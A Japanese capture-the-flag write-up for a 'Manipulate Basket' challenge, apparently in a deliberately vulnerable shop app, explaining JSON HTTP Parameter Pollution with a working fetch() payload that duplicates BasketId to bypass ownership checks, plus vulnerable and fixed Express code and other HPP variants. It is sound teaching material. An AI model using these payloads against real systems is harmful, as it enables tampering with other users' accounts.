# Manipulate Basket ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** HPP (HTTP Parameter Pollution)
**目標:** 他のユーザーのカートに商品を追加する

---

## 背景知識

### HTTP Parameter Pollution（HPP）とは

HPP は、**同じパラメータを複数回送信して、アプリケーションの動作を操作する攻撃**。サーバーやフレームワークによって、重複パラメータの処理方法が異なることを悪用する。

```
┌─────────────────────────────────────────────────────────────────┐
│                     HPP の基本概念                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【クエリストリング版】                                          │
│  URL: /search?category=books&category=electronics              │
│                        ↑           ↑                            │
│                   1番目の値    2番目の値                         │
│                                                                 │
│  サーバーの処理方法（フレームワークによる）:                       │
│  ┌────────────────────────────────────────────────┐            │
│  │ PHP       → 最後の値: "electronics"            │            │
│  │ ASP.NET   → カンマ区切り: "books,electronics"  │            │
│  │ Node.js   → 配列: ["books", "electronics"]     │            │
│  │ Python    → 最初の値: "books"                 │            │
│  └────────────────────────────────────────────────┘            │
│                                                                 │
│  【JSON版】(このチャレンジ)                                      │
│  { "id": 1, "id": 2 }                                          │
│      ↑         ↑                                                │
│  1番目の値  2番目の値（多くの実装で採用される）                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 日常的な例え

申請フォームの「部署名」欄を想像してください:

- **正しい処理**: 1つの部署名のみ受け付ける
- **脆弱な処理**: 部署名が2つ書かれていたら、2番目を採用する

攻撃者は「自分の部署」の下に「経理部」と書き足すことで、経理部として申請を通してしまう。

### なぜ危険なのか

```
┌─────────────────────────────────────────────────────────────────┐
│                     検証のすり抜け                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  リクエスト: { "BasketId": 1, "BasketId": 2, "ProductId": 5 }  │
│                     ↑             ↑                             │
│                  自分のID      他人のID                         │
│                                                                 │
│  【検証ロジック】                                                │
│  1. "BasketId" を取得 → 1（最初の値）                          │
│  2. ユーザー所有チェック → 自分のカートID → OK ✓                │
│                                                                 │
│  【保存ロジック】                                                │
│  1. JSON をパース                                               │
│  2. "BasketId" を取得 → 2（最後の値で上書きされる）             │
│  3. カートに追加 → 他人のカート！ 😱                            │
│                                                                 │
│  → 検証と保存で異なる値が使われる                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 思考プロセス

### ステップ1: カート追加機能を分析

```
「カートに商品を追加するAPIを観察」
    ↓
「POST /api/BasketItems/」
「Body: { ProductId: 1, BasketId: 1, quantity: 1 }」
    ↓
「BasketId がリクエストに含まれている...」
    ↓
「このIDを変えたら他人のカートに追加できる？」
```

### ステップ2: 単純な改ざんを試す

```
「BasketId を 2 に変更してリクエスト」
    ↓
「エラー: "Invalid BasketId for this user"」
    ↓
「検証が行われている... でもどの時点で？」
```

### ステップ3: HPP を発想

```
「検証時と保存時で別の値を使わせられないか」
    ↓
「同じキーを2回送ってみる」
    ↓
「{ BasketId: 1, BasketId: 2, ... }」
    ↓
「最初の 1 で検証をパス、最後の 2 で保存？」
```

### ステップ4: 攻撃を検証

```
「重複キーで送信」
    ↓
「成功！他人のカートに商品が追加された」
    ↓
「検証と保存で異なるパーサーが使われている可能性」
```

---

## 実行手順

### Step 1: 自分のカートIDを確認

```javascript
// Console で実行
const bid = sessionStorage.getItem('bid');
console.log('My Basket ID:', bid);  // 例: "6"
```

### Step 2: 通常のカート追加を観察

DevTools → Network で商品をカートに追加し、リクエストを確認:

```http
POST /api/BasketItems/ HTTP/1.1
Content-Type: application/json
Authorization: Bearer eyJ...

{
  "ProductId": 1,
  "BasketId": "6",
  "quantity": 1
}
```

### Step 3: 他人のBasketIdで単純に試す（失敗）

```javascript
// これは検証で弾かれる
fetch('/api/BasketItems/', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({
    ProductId: 1,
    BasketId: "2",  // 他人のカートID
    quantity: 1
  })
}).then(r => r.text()).then(console.log);
// → エラー
```

### Step 4: HPP で攻撃

```javascript
// 重複キーで送信（JSON文字列を手動で構築）
fetch('/api/BasketItems/', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: '{"ProductId":1,"BasketId":"6","BasketId":"2","quantity":1}'
  //                     ↑自分のID    ↑他人のID
}).then(r => r.json()).then(console.log);
```

**注意**: `JSON.stringify()` は重複キーを作れないため、文字列リテラルで直接記述する必要がある。

### Step 5: 結果を確認

成功すると、BasketId: 2 のカートに商品が追加される。

---

## JSON パーサーの動作の違い

```javascript
// 重複キーを含むJSONの解析
const json = '{"id": 1, "id": 2}';

// JavaScript (V8, Node.js)
JSON.parse(json);  // → { id: 2 }  最後の値

// Python
import json
json.loads('{"id": 1, "id": 2}')  # → {'id': 2}  最後の値

// Ruby
require 'json'
JSON.parse('{"id": 1, "id": 2}')  # → {"id"=>2}  最後の値
```

多くの実装で「最後の値が勝つ」が、これは**仕様で定義されていない**。

RFC 8259 (JSON):
> The names within an object SHOULD be unique.

「SHOULD」なので必須ではなく、重複時の動作は実装依存。

---

## 脆弱なコードパターン

```javascript
// ❌ 脆弱なコード
app.post('/api/BasketItems', (req, res) => {
  // 検証: 独自のパーサーやライブラリを使用
  const validationData = customParser(req.rawBody);
  if (validationData.BasketId !== req.user.basketId) {
    return res.status(403).send('Access denied');
  }

  // 保存: 別のパーサー（JSON.parse）を使用
  const data = JSON.parse(req.rawBody);  // ← 異なる値を取得する可能性
  BasketItem.create(data);
});
```

### 問題点

1. **パーサーの不一致**: 検証と保存で異なるパーサーを使用
2. **重複キーの未処理**: 重複キーを検出・拒否していない
3. **生のボディを複数回パース**: 毎回異なる結果になる可能性

---

## 安全な実装

```javascript
// ✅ 安全なコード
app.post('/api/BasketItems', (req, res) => {
  // 1. 一度だけパースして再利用
  const data = req.body;  // Express が一度だけパース

  // 2. BasketId はリクエストから受け取らない
  const basketItem = {
    ProductId: data.ProductId,
    BasketId: req.user.basketId,  // ← トークンから取得！
    quantity: data.quantity
  };

  // 3. 入力検証
  if (!basketItem.ProductId || !basketItem.quantity) {
    return res.status(400).send('Missing required fields');
  }

  BasketItem.create(basketItem);
  res.json({ status: 'success' });
});
```

### 対策のポイント

| 対策 | 説明 |
|------|------|
| **パーサーの統一** | 検証と保存で同じパース結果を使用 |
| **重複キーの検出** | 重複キーがあれば拒否 |
| **信頼できるソースから取得** | BasketId は認証トークンから |
| **ホワイトリスト** | 許可するフィールドのみ受け付け |

---

## HPP の他のパターン

### クエリストリング HPP

```
GET /transfer?amount=100&to=attacker&to=victim
```
WAF は `to=attacker` を見てブロック、アプリは `to=victim` を処理。

### フォームデータ HPP

```
POST /profile
role=user&role=admin
```

### Cookie HPP

```
Cookie: session=legitimate; session=attacker
```

---

## 関連チャレンジ

- [View Basket](../difficulty-2/view-basket.md) - IDOR でカートを閲覧
- [Forged Feedback](forged-feedback.md) - パラメータ改ざん
- [Payback Time](payback-time.md) - 入力検証バイパス

## 参考リンク

- [OWASP - HTTP Parameter Pollution](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)
- [RFC 8259 - The JavaScript Object Notation (JSON)](https://datatracker.ietf.org/doc/html/rfc8259)
- [CWE-235: Improper Handling of Extra Parameters](https://cwe.mitre.org/data/definitions/235.html)
